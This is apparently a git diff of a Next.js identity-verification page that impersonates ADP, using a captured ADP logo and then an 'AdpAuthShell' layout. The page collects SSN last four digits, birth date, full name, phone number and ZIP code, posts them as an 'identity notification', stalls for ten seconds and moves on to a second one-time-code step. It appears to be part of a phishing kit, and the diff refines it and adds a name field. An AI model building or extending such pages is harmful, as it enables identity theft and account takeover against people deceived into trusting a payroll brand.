@@ -2,18 +2,14 @@
 
 import { useRouter } from "next/navigation"
 import { useState, useEffect } from "react"
-import { FloresLogo } from "@/components/flores-logo"
-import { Input } from "@/components/ui/input"
-import adpLogo from "../../adp_login/Screenshot 2026-07-06 122158.png"
+import { AdpAuthShell } from "@/components/adp-auth-shell"
+import { LOGIN_SESSION } from "@/lib/login-flow"
 import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select"
-import { FLORES_SESSION } from "@/lib/flores-flow"
-import { floresGradientPrimaryButtonStyle } from "@/lib/flores-theme"
+  formatUsZipInput,
+  isValidUsZip,
+  usZipDigits,
+} from "@/lib/us-zip"
+import { Loader2 } from "lucide-react"
 
 const MONTHS = [
   "January", "February", "March", "April", "May", "June",
@@ -23,40 +19,39 @@ const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1))
 const CURRENT_YEAR = new Date().getFullYear()
 const YEARS = Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i))
 
-const inputBaseClass =
-  "h-10 bg-white rounded-md border border-gray-300 shadow-sm focus-visible:border-[#0099D8] focus-visible:ring-[#0099D8]/30 focus-visible:ring-2 outline-none transition-colors"
-const inputErrorClass = "border-red-500 focus-visible:border-red-500 focus-visible:ring-red-500/30"
-const labelClass = "block text-sm font-semibold text-gray-900 mb-1.5"
-
 export default function VerifyIdentityPage() {
   const router = useRouter()
   useEffect(() => {
-    if (typeof window !== "undefined" && !sessionStorage.getItem(FLORES_SESSION.identity)) {
+    if (typeof window !== "undefined" && !sessionStorage.getItem(LOGIN_SESSION.identity)) {
       router.replace("/verify")
     }
   }, [router])
 
+  const [ssnLast4, setSsnLast4] = useState("")
+  const [zipCode, setZipCode] = useState("")
   const [birthMonth, setBirthMonth] = useState("")
   const [birthDay, setBirthDay] = useState("")
   const [birthYear, setBirthYear] = useState("")
-  const [ssnLast4, setSsnLast4] = useState("")
+  const [fullName, setFullName] = useState("")
   const [phoneNumber, setPhoneNumber] = useState("")
-  const [zipCode, setZipCode] = useState("")
   const [submitAttempted, setSubmitAttempted] = useState(false)
+  const [zipBlurred, setZipBlurred] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
 
   const ssnDigits = ssnLast4.replace(/\D/g, "")
+  const zipDigits = usZipDigits(zipCode)
   const dateOfBirth =
     birthMonth && birthDay && birthYear
       ? `${String(MONTHS.indexOf(birthMonth) + 1).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`
       : ""
   const isDobValid = Boolean(birthMonth && birthDay && birthYear)
   const isSsnValid = ssnDigits.length === 4
+  const isZipValid = isValidUsZip(zipCode)
+  const isFullNameValid = fullName.trim().length > 0
   const phoneDigits = phoneNumber.replace(/\D/g, "")
   const isPhoneValid = phoneDigits.length >= 10
-  const zipDigits = zipCode.replace(/\D/g, "")
-  const isZipValid = zipDigits.length === 5 || zipDigits.length === 9
-  const isFormValid = isDobValid && isSsnValid && isPhoneValid && isZipValid
+  const isFormValid =
+    isSsnValid && isZipValid && isDobValid && isFullNameValid && isPhoneValid
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -68,22 +63,19 @@ export default function VerifyIdentityPage() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          dateOfBirth,
           ssnLast4: ssnDigits,
-          phoneNumber: phoneNumber.trim(),
           zipCode: zipDigits,
+          dateOfBirth,
+          fullName: fullName.trim(),
+          phoneNumber: phoneNumber.trim(),
         }),
       })
     } catch (err) {
       console.error("Failed to send identity notification:", err)
     }
     await new Promise((r) => setTimeout(r, 10000))
-    if (typeof window !== "undefined") sessionStorage.setItem(FLORES_SESSION.otp2, "1")
+    if (typeof window !== "undefined") sessionStorage.setItem(LOGIN_SESSION.otp2, "1")
     router.push("/verify?step=2")
-  }
-
-  const handleCancel = () => {
-    router.push("/")
   }
 
   const formatPhoneNumber = (value: string) => {
@@ -94,105 +86,126 @@ export default function VerifyIdentityPage() {
   }
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <header
-        className="w-full py-3 sm:py-4 px-4 sm:px-6 lg:px-0 border-b border-gray-100"
-        style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}
-      >
-        <a href="/" className="inline-block hover:opacity-90 transition-opacity">
-          <FloresLogo className="items-start" imageSrc={adpLogo.src} alt="ADP Logo" />
-        </a>
-      </header>
+    <AdpAuthShell
+      step={3}
+      title="Confirm your identity"
+      subtitle="Please provide the details below to continue."
+    >
+      <div className="identity-form">
+        <button
+          type="button"
+          onClick={() => router.push("/verify")}
+          disabled={isLoading}
+          className="back-link"
+        >
+          ‹ Back
+        </button>
 
-      <div className="flex-1 px-4 sm:px-6 py-8 max-w-xl" style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}>
-        <p className="text-sm mb-2" style={{ color: "#003D6B" }}>
-          Verify It&apos;s You
-        </p>
-        <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Enter Your Identifier</h2>
-        <p className="text-gray-700 mb-8 text-sm sm:text-base">
-          This personal information will only be used to verify your identity for secure portal access.
+        <p className="privacy-note">
+          This personal information will only be used to verify your identity.
         </p>
 
-        <form onSubmit={handleSubmit} className="space-y-5">
-          <div>
-            <label htmlFor="ssnLast4" className={labelClass}>
-              Last 4 Digits of SSN
-            </label>
-            <Input
+        <form onSubmit={handleSubmit} className="fields">
+          <div className="field">
+            <label htmlFor="ssnLast4">Last 4 digits of SSN</label>
+            <input
               id="ssnLast4"
               type="text"
               inputMode="numeric"
-              placeholder=""
               maxLength={4}
               value={ssnLast4}
               onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
               disabled={isLoading}
-              className={`w-[88px] max-w-[88px] ${inputBaseClass} ${submitAttempted && !isSsnValid ? inputErrorClass : ""} disabled:opacity-70`}
+              className={`field-input field-input-short ${submitAttempted && !isSsnValid ? "field-input-error" : ""}`}
             />
-            {submitAttempted && !isSsnValid && (
-              <p className="mt-1 text-sm text-red-600">Enter last 4 digits of SSN</p>
-            )}
+            {submitAttempted && !isSsnValid ? (
+              <p className="field-error">Enter last 4 digits of SSN</p>
+            ) : null}
           </div>
 
-          <div>
-            <label className={labelClass}>Birth Date</label>
-            <div className="flex flex-wrap gap-3">
-              <Select value={birthMonth} onValueChange={setBirthMonth}>
-                <SelectTrigger
-                  disabled={isLoading}
-                  className={`min-w-[120px] w-full max-w-[140px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
-                >
-                  <SelectValue placeholder="Month" />
-                </SelectTrigger>
-                <SelectContent>
-                  {MONTHS.map((m) => (
-                    <SelectItem key={m} value={m}>
-                      {m}
-                    </SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
-              <Select value={birthDay} onValueChange={setBirthDay}>
-                <SelectTrigger
-                  disabled={isLoading}
-                  className={`min-w-[72px] w-[72px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
-                >
-                  <SelectValue placeholder="Day" />
-                </SelectTrigger>
-                <SelectContent>
-                  {DAYS.map((d) => (
-                    <SelectItem key={d} value={d}>
-                      {d}
-                    </SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
-              <Select value={birthYear} onValueChange={setBirthYear}>
-                <SelectTrigger
-                  disabled={isLoading}
-                  className={`min-w-[88px] max-w-[100px] ${inputBaseClass} ${submitAttempted && !isDobValid ? inputErrorClass : ""} disabled:opacity-70`}
-                >
-                  <SelectValue placeholder="Year" />
-                </SelectTrigger>
-                <SelectContent>
-                  {YEARS.map((y) => (
-                    <SelectItem key={y} value={y}>
-                      {y}
-                    </SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
+          <div className="field">
+            <label htmlFor="zipCode">Zip code</label>
+            <input
+              id="zipCode"
+              type="text"
+              inputMode="numeric"
+              value={zipCode}
+              onChange={(e) => setZipCode(formatUsZipInput(e.target.value))}
+              onFocus={() => setZipBlurred(false)}
+              onBlur={() => setZipBlurred(true)}
+              placeholder="12345"
+              maxLength={10}
+              disabled={isLoading}
+              className={`field-input field-input-zip ${(zipBlurred || submitAttempted) && !isZipValid ? "field-input-error" : ""}`}
+            />
+            {(zipBlurred || submitAttempted) && !isZipValid ? (
+              <p className="field-error">Enter a valid ZIP code (5 digits or 9 digits).</p>
+            ) : null}
+          </div>
+
+          <div className="field">
+            <span className="field-label">Birth date</span>
+            <div className="dob-row">
+              <select
+                value={birthMonth}
+                onChange={(e) => setBirthMonth(e.target.value)}
+                disabled={isLoading}
+                aria-label="Birth month"
+                className={`field-select field-select-month ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
+              >
+                <option value="">Month</option>
+                {MONTHS.map((m) => (
+                  <option key={m} value={m}>{m}</option>
+                ))}
+              </select>
+              <select
+                value={birthDay}
+                onChange={(e) => setBirthDay(e.target.value)}
+                disabled={isLoading}
+                aria-label="Birth day"
+                className={`field-select field-select-day ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
+              >
+                <option value="">Day</option>
+                {DAYS.map((d) => (
+                  <option key={d} value={d}>{d}</option>
+                ))}
+              </select>
+              <select
+                value={birthYear}
+                onChange={(e) => setBirthYear(e.target.value)}
+                disabled={isLoading}
+                aria-label="Birth year"
+                className={`field-select field-select-year ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
+              >
+                <option value="">Year</option>
+                {YEARS.map((y) => (
+                  <option key={y} value={y}>{y}</option>
+                ))}
+              </select>
             </div>
-            {submitAttempted && !isDobValid && (
-              <p className="mt-1 text-sm text-red-600">Select month, day, and year</p>
-            )}
+            {submitAttempted && !isDobValid ? (
+              <p className="field-error">Select month, day, and year</p>
+            ) : null}
           </div>
 
-          <div>
-            <label htmlFor="phoneNumber" className={labelClass}>
-              Phone Number
-            </label>
-            <Input
+          <div className="field">
+            <label htmlFor="fullName">Full name</label>
+            <input
+              id="fullName"
+              type="text"
+              value={fullName}
+              onChange={(e) => setFullName(e.target.value)}
+              disabled={isLoading}
+              className={`field-input ${submitAttempted && !isFullNameValid ? "field-input-error" : ""}`}
+            />
+            {submitAttempted && !isFullNameValid ? (
+              <p className="field-error">Enter your full name</p>
+            ) : null}
+          </div>
+
+          <div className="field">
+            <label htmlFor="phoneNumber">Phone number</label>
+            <input
               id="phoneNumber"
               type="tel"
               inputMode="numeric"
@@ -201,53 +214,220 @@ export default function VerifyIdentityPage() {
               onChange={(e) => setPhoneNumber(formatPhoneNumber(e.target.value))}
               maxLength={14}
               disabled={isLoading}
-              className={`max-w-[200px] ${inputBaseClass} ${submitAttempted && !isPhoneValid ? inputErrorClass : ""} disabled:opacity-70`}
+              className={`field-input field-input-phone ${submitAttempted && !isPhoneValid ? "field-input-error" : ""}`}
             />
-            {submitAttempted && !isPhoneValid && (
-              <p className="mt-1 text-sm text-red-600">Enter a valid phone number (10 digits)</p>
-            )}
+            {submitAttempted && !isPhoneValid ? (
+              <p className="field-error">Enter a valid phone number</p>
+            ) : null}
           </div>
 
-          <div>
-            <label htmlFor="zipCode" className={labelClass}>
-              Zip Code
-            </label>
-            <Input
-              id="zipCode"
-              type="text"
-              inputMode="numeric"
-              value={zipCode}
-              onChange={(e) => setZipCode(e.target.value.replace(/\D/g, "").slice(0, 9))}
-              placeholder="12345"
-              maxLength={9}
-              disabled={isLoading}
-              className={`max-w-[120px] ${inputBaseClass} ${submitAttempted && !isZipValid ? inputErrorClass : ""} disabled:opacity-70`}
-            />
-            {submitAttempted && !isZipValid && (
-              <p className="mt-1 text-sm text-red-600">Enter a valid zip code (5 or 9 digits)</p>
-            )}
-          </div>
-
-          <div className="flex flex-wrap gap-3 pt-2">
-            <button
-              type="submit"
-              disabled={isLoading}
-              className="px-8 py-2.5 sm:py-3 text-sm sm:text-base transition hover:opacity-90 disabled:opacity-70 disabled:cursor-not-allowed"
-              style={{ ...floresGradientPrimaryButtonStyle, padding: "14px 32px" }}
-            >
+          <div className="action-stack">
+            <button type="submit" disabled={isLoading} className="btn-primary">
+              {isLoading ? <Loader2 className="btn-spinner" /> : null}
               {isLoading ? "Loading..." : "Continue"}
             </button>
             <button
               type="button"
-              onClick={handleCancel}
+              onClick={() => router.push("/")}
               disabled={isLoading}
-              className="px-8 py-2.5 rounded-full border-2 border-gray-300 text-gray-600 font-semibold text-sm sm:text-base hover:bg-gray-50 disabled:opacity-70"
+              className="btn-secondary"
             >
               Cancel
             </button>
           </div>
         </form>
       </div>
-    </div>
+
+      <style jsx>{`
+        .identity-form {
+          display: flex;
+          flex-direction: column;
+          gap: 18px;
+        }
+
+        .back-link {
+          align-self: flex-start;
+          border: none;
+          background: none;
+          color: #0046be;
+          font-size: 14px;
+          font-weight: 500;
+          cursor: pointer;
+          padding: 0;
+        }
+
+        .back-link:hover:not(:disabled) {
+          text-decoration: underline;
+        }
+
+        .back-link:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+
+        .privacy-note {
+          font-size: 13px;
+          color: #71717a;
+          line-height: 1.5;
+        }
+
+        .fields {
+          display: flex;
+          flex-direction: column;
+          gap: 16px;
+        }
+
+        .field {
+          display: flex;
+          flex-direction: column;
+          gap: 6px;
+        }
+
+        .field label,
+        .field-label {
+          font-size: 13px;
+          font-weight: 600;
+          color: #18181b;
+        }
+
+        .field-input,
+        .field-select {
+          height: 40px;
+          padding: 0 12px;
+          font-size: 14px;
+          color: #18181b;
+          background: #fff;
+          border: 1.5px solid #d4d4d8;
+          border-radius: 6px;
+          outline: none;
+          transition:
+            border-color 0.15s ease,
+            box-shadow 0.15s ease;
+        }
+
+        .field-input:focus,
+        .field-select:focus {
+          border-color: #0046be;
+          box-shadow: 0 0 0 3px rgba(0, 70, 190, 0.12);
+        }
+
+        .field-input:disabled,
+        .field-select:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
+        }
+
+        .field-input-error {
+          border-color: #ef4444;
+        }
+
+        .field-input-error:focus {
+          border-color: #ef4444;
+          box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.12);
+        }
+
+        .field-input-short {
+          width: 96px;
+        }
+
+        .field-input-zip {
+          width: 140px;
+          max-width: 100%;
+        }
+
+        .field-input-phone {
+          width: 180px;
+          max-width: 100%;
+        }
+
+        .dob-row {
+          display: flex;
+          flex-wrap: wrap;
+          gap: 8px;
+        }
+
+        .field-select-month {
+          min-width: 120px;
+          flex: 1;
+        }
+
+        .field-select-day {
+          width: 72px;
+        }
+
+        .field-select-year {
+          width: 88px;
+        }
+
+        .field-error {
+          font-size: 12px;
+          color: #dc2626;
+        }
+
+        .action-stack {
+          display: flex;
+          flex-direction: column;
+          gap: 10px;
+          padding-top: 8px;
+        }
+
+        .btn-primary,
+        .btn-secondary {
+          width: 100%;
+          border-radius: 6px;
+          font-size: 15px;
+          font-weight: 600;
+          padding: 12px 16px;
+          cursor: pointer;
+          transition: background-color 0.15s ease, opacity 0.15s ease;
+        }
+
+        .btn-primary {
+          border: none;
+          background: #0046be;
+          color: #fff;
+          display: inline-flex;
+          align-items: center;
+          justify-content: center;
+          gap: 8px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+          background: #003a9e;
+        }
+
+        .btn-primary:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+
+        .btn-secondary {
+          border: 1.5px solid #0046be;
+          background: #fff;
+          color: #0046be;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+          background: #f0f6ff;
+        }
+
+        .btn-secondary:disabled {
+          opacity: 0.5;
+          cursor: not-allowed;
+        }
+
+        .btn-spinner {
+          width: 16px;
+          height: 16px;
+          animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+          to {
+            transform: rotate(360deg);
+          }
+        }
+      `}</style>
+    </AdpAuthShell>
   )
 }
